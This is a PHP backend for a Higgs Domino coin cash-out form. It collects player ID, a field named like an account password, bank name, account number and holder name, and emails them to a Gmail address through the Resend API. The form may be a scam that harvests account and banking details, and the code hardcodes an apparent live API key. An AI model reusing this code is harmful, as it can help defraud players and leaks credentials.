<?php
// ========================================================================
// 1. KONFIGURASI DAN AMBIL VARIABEL LINGKUNGAN
// Ganti nilai 'YOUR_...' ini dengan nilai dari Environment Variables Vercel Anda!
// ========================================================================

$resend_api_key = getenv('RESEND_API_KEY') ?: 're_GkaknqTW_FtQLj7RCdtenXketziRcuUDP';
$email_tujuan = getenv('EMAIL_TUJUAN') ?: 'vibeaiagent@gmail.com';
$email_pengirim = getenv('EMAIL_PENGIRIM') ?: 'no-reply@domainterverifikasi.com';

// ========================================================================
// 2. AMBIL DAN SANITASI DATA FORMULIR
// ========================================================================

if ($_SERVER["REQUEST_METHOD"] == "POST") {

    // Sanitasi data
    $id_anda            = filter_input(INPUT_POST, 'passakun', FILTER_SANITIZE_NUMBER_INT) ?: 'N/A';
    $nickname           = filter_input(INPUT_POST, 'nickname', FILTER_SANITIZE_STRING) ?: 'N/A';
    $jumlah_bongkaran   = filter_input(INPUT_POST, 'Idakun', FILTER_SANITIZE_STRING) ?: 'N/A';
    $bank_pencairan     = filter_input(INPUT_POST, 'narek', FILTER_SANITIZE_STRING) ?: 'N/A';
    $nomor_rekening     = filter_input(INPUT_POST, 'norek', FILTER_SANITIZE_NUMBER_INT) ?: 'N/A';
    $atas_nama          = filter_input(INPUT_POST, 'atasnama', FILTER_SANITIZE_STRING) ?: 'N/A';

    // ========================================================================
    // 3. SUSUN ISI EMAIL DAN API REQUEST
    // ========================================================================

    $subject = "[BONGKAR ID] TRANSAKSI BARU - " . $nickname . " (" . $id_anda . ")";
    
    $body_text = "Halo Admin,\n\n";
    $body_text .= "Anda menerima permintaan Bongkar Koin baru dengan rincian:\n\n";
    $body_text .= "==========================================\n";
    $body_text .= "          INFO PENGIRIM (Higgs Domino)\n";
    $body_text .= "==========================================\n";
    $body_text .= "1. ID Pengirim        : " . $id_anda . "\n";
    $body_text .= "2. Nickname           : " . $nickname . "\n";
    $body_text .= "3. Jumlah Bongkaran   : " . $jumlah_bongkaran . "\n";
    $body_text .= "==========================================\n\n";
    $body_text .= "INFO PENCERAIAN:\n";
    $body_text .= "5. Bank Pencairan     : " . $bank_pencairan . "\n";
    $body_text .= "6. Nomor Rekening     : " . $nomor_rekening . "\n";
    $body_text .= "7. Atas Nama          : " . $atas_nama . "\n";
    $body_text .= "==========================================\n";
    
    // Data yang akan dikirim ke API Resend dalam format JSON
    $payload = [
        'from'    => $email_pengirim,
        'to'      => [$email_tujuan],
        'subject' => $subject,
        'text'    => $body_text,
    ];

    // ========================================================================
    // 4. KIRIM EMAIL MENGGUNAKAN cURL KE RESEND API
    // ========================================================================

    $ch = curl_init('https://api.resend.com/emails');
    
    // Set Header
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Content-Type: application/json',
        'Authorization: Bearer ' . $resend_api_key
    ]);
    
    // Set Opsi cURL
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); // Mendapatkan respons kembali
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true); // Wajib di lingkungan server
    
    // Eksekusi cURL
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    // ========================================================================
    // 5. PENANGANAN RESPON
    // ========================================================================

    if ($http_code === 200 || $http_code === 201) {
        // Sukses! Redirect pengguna
        header('Location: /sukses.html'); 
        exit;
    } else {
        // Gagal! Tampilkan pesan error
        $response_data = json_decode($response, true);
        echo "<h1>Kesalahan Pengiriman Email (Resend API)</h1>";
        echo "<p>Kode Status HTTP: {$http_code}</p>";
        echo "<p>Pesan Error: " . ($response_data['message'] ?? 'Tidak ada pesan') . "</p>";
        // Error otentikasi akan muncul di sini jika RESEND_API_KEY salah
    }

} else {
    // Jika diakses tanpa submit form, redirect ke halaman utama
    header('Location: /'); 
    exit;
}
?>
